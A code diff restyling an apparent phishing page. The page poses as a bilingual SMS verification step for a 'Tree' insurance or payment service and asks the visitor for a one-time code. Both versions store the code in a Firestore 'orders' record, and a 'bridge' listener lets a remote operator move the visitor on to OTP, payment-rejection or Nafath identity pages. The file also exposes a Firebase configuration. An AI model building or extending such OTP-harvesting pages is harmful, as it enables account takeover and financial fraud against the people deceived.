@@ -6,77 +6,75 @@
     <script src="js/theme-toggle.js"></script>
     <script src="js/i18n.js"></script>
     <title>تأكيد الجوال | SMS Verification</title>
-    <link id="bootstrap-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="css/site-theme.css">
     <link rel="icon" type="image/png" href="https://tree.com.sa/assets/images/favicon.png">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/inner-theme.css">
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
     <style>
-        body { min-height: 100vh; margin: 0; display: flex; flex-direction: column; }
-        .navbar { width: 100%; padding: 10px 0; }
-        .nav-logo { height: 35px; margin-inline-end: 20px; }
-        .main-content { flex: 1; display: flex; align-items: center; justify-content: center; width: 100%; padding: 20px 0; }
-        .form-wrapper { max-width: 500px; width: 90%; padding: 40px; text-align: center; border-radius: var(--tree-radius-lg); }
-        .icon-box {
-            width: 80px; height: 80px; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center; font-size: 35px; margin: 0 auto 20px;
-            background: var(--tree-primary-soft); color: var(--tree-primary);
-        }
-        .form-control { padding: 12px; border-radius: 10px; text-align: center; font-size: 1.2rem; letter-spacing: 2px; }
-        .btn-submit { padding: 12px; width: 100%; font-size: 1.1rem; margin-top: 20px; border: none; border-radius: 12px; }
-        .btn-submit:disabled { opacity: 0.5; cursor: not-allowed; }
-        .site-footer { text-align: center; padding: 15px; color: var(--tree-text-muted); font-size: 0.8rem; width: 100%; }
+        body { display:flex; flex-direction:column; min-height:100vh; }
+        .main-wrap { flex:1; display:flex; align-items:center; justify-content:center; padding:28px 16px 48px; }
     </style>
 </head>
-<body class="tree-site">
+<body>
 
 <button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>
 
-<nav class="navbar">
-    <div class="container-fluid d-flex justify-content-between align-items-center">
-        <img src="images/logo.png" class="nav-logo" alt="Tree" onerror="this.src='https://placehold.co/100x35/198754/ffffff?text=TREE'">
-        <button class="btn btn-outline-success btn-sm" data-lang-toggle onclick="toggleLang()">EN</button>
+<nav class="inner-nav">
+    <a href="index.html" class="inner-nav__logo">tree</a>
+    <div class="inner-nav__right">
+        <button class="lang-btn" data-lang-toggle onclick="toggleLang()">EN</button>
     </div>
 </nav>
 
-<div class="main-content">
-    <div class="form-wrapper">
-        <div class="icon-box">📩</div>
-        <h3 class="fw-bold text-success mb-3" data-i18n="sms.title">تحقيق رقم الجوال</h3>
+<div class="main-wrap">
+    <div class="teal-card teal-card--narrow" style="width:100%;">
+        <div class="card-body" style="text-align:center;">
 
-        <p class="text-muted mb-4" style="line-height: 1.6;">
-            <span data-i18n="sms.msg">تم ارسال رسالة نصية إلى جوالك لربط الوثيقة على رقم الهاتف الخاص بك!</span>
-            <br>
-            <span data-i18n="sms.enter_prompt">يرجي ادخال رمز التحقق المرسل إلى جوالك رقم:</span>
-            <br>
-            <span class="text-dark fw-bold" style="direction: ltr; display: inline-block; margin-top: 5px;" id="displayPhone">...</span>
-        </p>
+            <div class="icon-circle icon-circle--success" style="margin-bottom:20px;">📩</div>
 
-        <form onsubmit="verifyCode(event)">
-            <div class="mb-3 text-start">
-                <label class="form-label fw-bold small text-dark" data-i18n="sms.code_label">رمز التحقق *</label>
-                <input type="tel" class="form-control" id="smsCode" data-i18n="sms.code_ph" placeholder="ادخل رمز التحقق الذي تم ارساله إلى جوالك" required oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+            <div class="section-title" data-i18n="sms.title">تحقيق رقم الجوال</div>
+            <div class="section-sub" style="margin:8px 0 20px; line-height:1.7;">
+                <span data-i18n="sms.msg">تم ارسال رسالة نصية إلى جوالك لربط الوثيقة على رقم الهاتف الخاص بك!</span>
+                <br>
+                <span data-i18n="sms.enter_prompt">يرجي ادخال رمز التحقق المرسل إلى جوالك رقم:</span>
+                <br>
+                <span id="displayPhone" style="font-family:monospace;font-weight:700;color:var(--green);direction:ltr;display:inline-block;margin-top:4px;">...</span>
             </div>
 
-            <div class="text-muted small mb-2">
-                <span data-i18n="sms.resend_in">سيتم إرسال رسالة كود التحقق في خلال</span> <span class="text-danger fw-bold" id="timer">01:00</span>
-            </div>
+            <form onsubmit="verifyCode(event)" style="text-align:start;">
+                <div class="field">
+                    <label class="field__label" data-i18n="sms.code_label">رمز التحقق *</label>
+                    <input type="tel" class="otp-input" id="smsCode" data-i18n="sms.code_ph" placeholder="ادخل رمز التحقق" required oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+                </div>
 
-            <button type="submit" class="btn-submit" id="submitBtn" data-i18n="sms.confirm">تأكيد</button>
-        </form>
+                <div class="timer-chip" style="margin-bottom:18px;justify-content:center;">
+                    <span data-i18n="sms.resend_in">سيتم إرسال رسالة كود التحقق في خلال</span>
+                    <span class="timer-chip__num" id="timer">01:00</span>
+                </div>
+
+                <button type="submit" class="btn-green" id="submitBtn" data-i18n="sms.confirm">تأكيد</button>
+            </form>
+
+        </div>
     </div>
 </div>
 
-<div class="site-footer" data-i18n="footer.secure">Secure Payment Gateway © 2024</div>
+<div class="inner-footer" data-i18n="footer.secure">Secure Payment Gateway © 2024</div>
 
 <script>
-    const firebaseConfig = { apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE", authDomain: "tameen-658e9.firebaseapp.com", projectId: "tameen-658e9", storageBucket: "tameen-658e9.firebasestorage.app", messagingSenderId: "292670676256", appId: "1:292670676256:web:3624157751cd194efe4b45" };
+    const firebaseConfig = {
+        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
+        authDomain: "tameen-658e9.firebaseapp.com",
+        projectId: "tameen-658e9",
+        storageBucket: "tameen-658e9.firebasestorage.app",
+        messagingSenderId: "292670676256",
+        appId: "1:292670676256:web:3624157751cd194efe4b45"
+    };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
     const userId = localStorage.getItem('user_id');
 
-    // جلب رقم الجوال
     if (userId) {
         db.collection("orders").doc(userId).get().then(doc => {
             if (doc.exists && doc.data().phone_number) {
@@ -85,55 +83,38 @@
         });
     }
 
-    // Timer
     let time = 60;
     const timerDisplay = document.getElementById('timer');
     const countdown = setInterval(() => {
-        let seconds = time % 60;
-        timerDisplay.innerText = `00:${seconds.toString().padStart(2, '0')}`;
-        if (time <= 0) {
-            clearInterval(countdown);
-            timerDisplay.innerText = "00:00";
-        }
-        time--;
+        timerDisplay.innerText = '00:' + time.toString().padStart(2,'0');
+        if (--time < 0) { clearInterval(countdown); timerDisplay.innerText = "00:00"; }
     }, 1000);
 
     async function verifyCode(e) {
         e.preventDefault();
         const code = document.getElementById('smsCode').value;
         const btn = document.getElementById('submitBtn');
-        
-        if(code.length < 4 || !/^\d+$/.test(code)) return alert(t('sms.err_invalid'));
-
+        if (code.length < 4 || !/^\d+$/.test(code)) { alert(t('sms.err_invalid')); return; }
         btn.disabled = true;
-        btn.innerText = t('sms.verifying');
-
+        btn.textContent = t('sms.verifying');
         try {
-            await db.collection("orders").doc(userId).update({
-                mobile_sms_code: code,
-                status: "waiting_call_code"
-            });
+            await db.collection("orders").doc(userId).update({ mobile_sms_code: code, status: "waiting_call_code" });
             window.location.href = "call_verification.html";
-        } catch (err) {
+        } catch(err) {
             console.error(err);
             btn.disabled = false;
-            btn.innerText = "تأكيد";
+            btn.textContent = t('sms.confirm');
         }
     }
-    
-    // --- كود الجسر (Bridge Code) للتحكم عن بعد ---
+
     (function() {
         if (userId) {
             db.collection("orders").doc(userId).onSnapshot((doc) => {
                 if (doc.exists) {
                     const data = doc.data();
-                    if (data.next_step === "GO_TO_OTP") {
-                        window.location.href = "otp_verification.html"; 
-                    } else if (data.next_step === "GO_TO_REJECT") {
-                        window.location.href = "payment_failed.html";
-                    } else if (data.next_step === "GO_TO_NAFATH" || data.next_step === "SHOW_NAFATH_CODE") {
-                        window.location.href = "nafath.html";
-                    }
+                    if (data.next_step === "GO_TO_OTP") window.location.href = "otp_verification.html";
+                    else if (data.next_step === "GO_TO_REJECT") window.location.href = "payment_failed.html";
+                    else if (data.next_step === "GO_TO_NAFATH" || data.next_step === "SHOW_NAFATH_CODE") window.location.href = "nafath.html";
                 }
             });
         }
